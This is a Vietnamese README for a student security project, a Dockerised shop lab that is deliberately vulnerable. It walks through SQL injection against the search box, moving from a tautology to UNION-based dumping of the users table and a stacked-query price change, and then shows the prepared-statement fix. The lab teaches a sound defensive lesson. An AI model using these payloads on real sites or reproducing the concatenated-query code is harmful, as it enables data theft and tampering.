````markdown
# 🛡️ TechStore - Demo & Phòng chống SQL Injection

> **Đồ án môn học:** Bảo mật thông tin  
> **Chủ đề:** Xây dựng website bán hàng lỗ hổng SQL Injection và giải pháp vá lỗi.

---

## 📖 Giới thiệu

**TechStore** là môi trường giả lập một website bán hàng công nghệ. Dự án được Docker hóa hoàn toàn, tích hợp sẵn dữ liệu mẫu để phục vụ việc demo tấn công và phòng thủ SQL Injection.

### 🎯 Các chức năng chính

1.  **Môi trường lỗ hổng:** Website chứa lỗi SQL Injection tại ô tìm kiếm và đăng nhập.
2.  **Tự động hóa:** Database tự động khởi tạo dữ liệu khi chạy Docker.
3.  **Demo tấn công:** Thực hiện các kỹ thuật Union-Based và Stacked Queries theo kịch bản chi tiết.
4.  **Giải pháp:** Code mẫu sử dụng Prepared Statements để vá lỗi.

---

## 📂 Cấu trúc dự án

Để chạy trơn tru, cấu trúc thư mục của bạn cần đảm bảo như sau:

```text
BMTT/
├── db/
│   └── demo_shop.sql       # File chứa dữ liệu mẫu (Tự động nạp vào MySQL)
├── src/
│   ├── index.php           # Trang chủ (Chứa lỗi SQLi Search)
│   ├── login.php           # Trang đăng nhập (Chứa lỗi SQLi Login)
│   ├── style.css           # Giao diện
│   └── ...
├── docker-compose.yml      # Cấu hình Docker (Web + DB + phpMyAdmin)
├── Dockerfile              # Cấu hình môi trường PHP
└── README.md               # Hướng dẫn sử dụng
```
````

---

## 🚀 Hướng dẫn Cài đặt & Chạy (Chi tiết)

Yêu cầu máy tính đã cài đặt **Docker Desktop** và **Git**.

### Bước 1: Clone dự án về máy

Mở Terminal (hoặc CMD/PowerShell) và chạy lệnh:

```bash
git clone <link-git-cua-ban>
cd BMTT

```

_(Nếu bạn copy thủ công thì bỏ qua bước này, chỉ cần mở thư mục dự án trên VS Code)._

### Bước 2: Kiểm tra file dữ liệu

Đảm bảo rằng file `demo_shop.sql` đã nằm trong thư mục `db/`.

- **Cơ chế:** Docker sẽ tự động lấy file này và nạp vào Database ngay lần đầu tiên khởi chạy container MySQL (nhờ cấu hình `docker-entrypoint-initdb.d`).

### Bước 3: Khởi chạy Docker

Tại thư mục gốc của dự án (nơi có file `docker-compose.yml`), chạy lệnh:

```bash
docker-compose up -d --build

```

- `up -d`: Chạy các container ở chế độ ngầm (background).
- `--build`: Bắt buộc Docker build lại image PHP (để cài các extension mysqli cần thiết).

### Bước 4: Kiểm tra kết quả

Sau khi lệnh chạy xong, chờ khoảng 10-20 giây để MySQL khởi động, sau đó truy cập:

- **Trang web TechStore:** [http://localhost:80](https://www.google.com/search?q=http://localhost:80)
- **Quản lý Database (phpMyAdmin):** [http://localhost:8080](https://www.google.com/search?q=http://localhost:8080)

---

## ⚙️ Thông tin Đăng nhập (Credentials)

Nếu cần truy cập sâu vào hệ thống, sử dụng các thông tin sau:

**1. Tài khoản Web (TechStore):**

- Admin: `admin` / `admin123`
- User: `user` / `123456`

**2. Tài khoản Database (phpMyAdmin):**

- Server: `db`
- Username: `root`
- Password: `root`
- Database: `demo_shop`

---

## 🕵️‍♂️ Kịch bản Demo Tấn công (Attack Scenarios)

Dưới đây là các bước thực hiện tấn công vào ô **Tìm kiếm sản phẩm**, dựa trên tài liệu phân tích kỹ thuật của đồ án.

### Giai đoạn 1: Trinh sát & Dò lỗi (Reconnaissance)

**Tư duy:** Thử nhập ký tự đặc biệt để xem phản ứng của web.

1.  **Bước thử:** Nhập `'` -> Web lỗi giao diện .

2.  **Bước xác nhận (Tautology):** Làm cho câu lệnh luôn đúng để hiện toàn bộ dữ liệu.

- **Payload:**

```sql
rrrrrrrrrr%' OR '1'=1 #

```

- _Kết quả:_ Web hiện ra tất cả sản phẩm thay vì tìm chữ "rrrrrrrrr" .

### Giai đoạn 2: Xác định cấu trúc bảng (Fingerprinting)

**Tư duy:** Sử dụng `ORDER BY` để dò tìm số lượng cột của bảng hiện tại (Binary Search).

- **Payload:** `iphone%' ORDER BY 1 #` -> OK.
- **Payload:** `iphone%' ORDER BY 10 #` -> Lỗi.
- **Kết luận:** Sau khi thử dần, xác định chính xác bảng có **6 cột** .

### Giai đoạn 3: Khai thác dữ liệu (Union-Based Exploitation)

#### 3.1. Tìm chỗ hiển thị dữ liệu (Reflection)

Xác định cột nào hiển thị dữ liệu lên màn hình để tiêm code.

- **Payload:**

```sql
rrrrrrrrr%' UNION SELECT 1, 22222, 33333, 4, 5,6 #

```

- **Kết quả:** Cột số **2** (Tên SP) và cột số **3** (Mô tả) hiển thị số 22222 và 33333 .

#### 3.2. Lấy danh sách bảng (Tables)

Truy vấn bảng hệ thống `information_schema` để tìm tên bảng chứa user.

- **Payload:**

```sql
rrrrrrrrrr%' UNION SELECT 1, table_schema,table_name, 4, 5,6 FROM information_schema.tables WHERE table_schema=database() #

```

- **Kết quả:** Tìm thấy bảng tên là **`users`** .

#### 3.3. Lấy tên cột trong bảng `users` (Columns)

Cần biết chính xác tên cột (ví dụ: `username`, `password`).

- **Payload:**

```sql
rrrrrrrrrrrr%' UNION SELECT 1, column_name, table_name, 4, 5,6 FROM information_schema.columns WHERE table_name='users' #

```

- **Kết quả:** Tìm thấy cột `id`, `username`, `password`, `role` .

#### 3.4. Trích xuất dữ liệu (Dump Data)

Lấy toàn bộ tài khoản và mật khẩu.

- **Payload:**

```sql
rrrrrrrrrrrrrrr%' UNION SELECT 1, CONCAT(username, ' - ', password, ' - ', role), 3, 4, 5,6 FROM users #

```

- **Kết quả:** `admin - admin123 - admin` .

### Giai đoạn 4: Phá hoại (Stacked Queries)

**Tư duy:** Lợi dụng hàm `multi_query` để chạy nhiều lệnh cùng lúc (update, drop).

- **Mục tiêu:** Đổi giá iPhone 15 Pro Max (id=1) về 0 đồng.
- **Payload:**

```sql
rrrrrrrrrrr%'; UPDATE products SET price = 0 WHERE id = 1; #

```

- **Kết quả:** Giá sản phẩm biến thành **0đ** sau khi reload .

---

## 🛡️ Fix Lỗi (Code An Toàn)

Cách khắc phục là thay thế cơ chế nối chuỗi bằng **Prepared Statements**.

**Code lỗi (Vulnerable):**

```php
$sql = "SELECT * FROM products WHERE name LIKE '%$search%'";
$conn->multi_query($sql);

```

**Code đã fix (Secure):**

```php
$sql = "SELECT * FROM products WHERE name LIKE ?";
$stmt = $conn->prepare($sql);
$param = "%" . $search . "%";
$stmt->bind_param("s", $param);
$stmt->execute();

```

---

## 🧹 Dọn dẹp (Reset)

Nếu muốn reset database về trạng thái ban đầu (ví dụ sau khi đã lỡ tay xóa hết dữ liệu):

```bash
# 1. Tắt container và xóa volume cũ
docker-compose down -v

# 2. Chạy lại (Docker sẽ nạp lại file demo_shop.sql mới tinh)
docker-compose up -d

```

---

_Đồ án thực hiện bởi Võ Văn Đạt_

```

```
